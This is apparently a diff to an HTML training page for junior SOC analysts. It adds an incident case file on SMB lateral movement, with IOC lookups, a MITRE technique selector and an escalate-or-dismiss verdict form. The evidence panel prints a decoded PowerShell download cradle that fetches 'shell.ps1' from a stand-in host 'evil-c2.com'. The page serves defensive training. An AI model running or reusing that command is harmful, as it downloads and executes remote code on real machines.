@@ -13,6 +13,7 @@
       <p>A hands-on training lab for future L1 SOC analysts: triage alerts, read email headers, check IOCs, and map incidents to MITRE ATT&CK.</p>
       <nav class="tabs" id="tabs" role="tablist">
         <button class="tab active" data-tab="triage" role="tab" aria-selected="true">SOC Triage</button>
+        <button class="tab" data-tab="caseFile" role="tab" aria-selected="false">Case File</button>
         <button class="tab" data-tab="headers" role="tab" aria-selected="false">Email Headers</button>
         <button class="tab" data-tab="ioc" role="tab" aria-selected="false">IOC Lookup</button>
         <button class="tab" data-tab="mitre" role="tab" aria-selected="false">MITRE Map</button>
@@ -45,6 +46,62 @@
         </div>
         <div id="triageFeedback" class="feedback" hidden></div>
         <button id="btnNextAlert" class="btn-primary" hidden>Next alert</button>
+      </div>
+    </section>
+
+    <!-- Incident Response Case File -->
+    <section id="caseFile" class="lab">
+      <h2>Incident Response Case File</h2>
+      <p class="hint">Work one real SOC case from alert to verdict. Review evidence, click IOCs, pick the right MITRE technique, and explain your decision.</p>
+
+      <div class="card">
+        <div class="alert-meta">
+          <span id="caseId">IR-2026-10-30-001</span>
+          <span class="level-pill">High severity</span>
+        </div>
+        <h3>SMB Lateral Movement + Encoded PowerShell</h3>
+        <p>EDR raised an alert on <strong>WORKSTATION-42</strong>: multiple failed Windows logons from <strong>10.0.0.55</strong> were followed by a successful logon, then an encoded PowerShell command and an outbound HTTPS connection to a rare domain.</p>
+      </div>
+
+      <div class="card">
+        <h3>Evidence logs</h3>
+        <div id="caseLogs"></div>
+        <div id="caseDecodeOutput" class="log-block" hidden>
+          <strong>Decoded command:</strong><br>
+          IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.com/shell.ps1')
+        </div>
+        <button id="caseDecode" class="btn-secondary">Decode PowerShell payload</button>
+      </div>
+
+      <div class="card">
+        <h3>Indicators of Compromise</h3>
+        <p class="hint">Click any IOC to simulate a threat-intel lookup.</p>
+        <div id="caseIocs" class="ioc-list"></div>
+        <div id="caseIocOutput" class="ioc-result" hidden>
+          <div id="caseIocVerdict" class="verdict"></div>
+          <div id="caseIocDetails"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Your verdict</h3>
+        <label for="caseMitre" class="sr-only">Primary MITRE technique</label>
+        <select id="caseMitre" class="mitre-select">
+          <option value="">Select the most relevant MITRE technique…</option>
+        </select>
+
+        <label for="caseVerdict" class="sr-only">Decision</label>
+        <select id="caseVerdict" class="mitre-select">
+          <option value="">Escalate or dismiss?</option>
+          <option value="escalate">Escalate to L2 / Incident Response</option>
+          <option value="dismiss">Dismiss as noise / false positive</option>
+        </select>
+
+        <label for="caseRationale" class="sr-only">Rationale</label>
+        <textarea id="caseRationale" rows="5" placeholder="Explain your decision in 2-3 sentences. What did you see? Why does it matter?"></textarea>
+
+        <button id="caseSubmit" class="btn-primary">Submit verdict</button>
+        <div id="caseFeedback" class="feedback" hidden></div>
       </div>
     </section>
 
@@ -167,5 +224,6 @@
 
   <script src="js/app.js"></script>
   <script src="js/soc.js"></script>
+  <script src="js/case.js"></script>
 </body>
 </html>
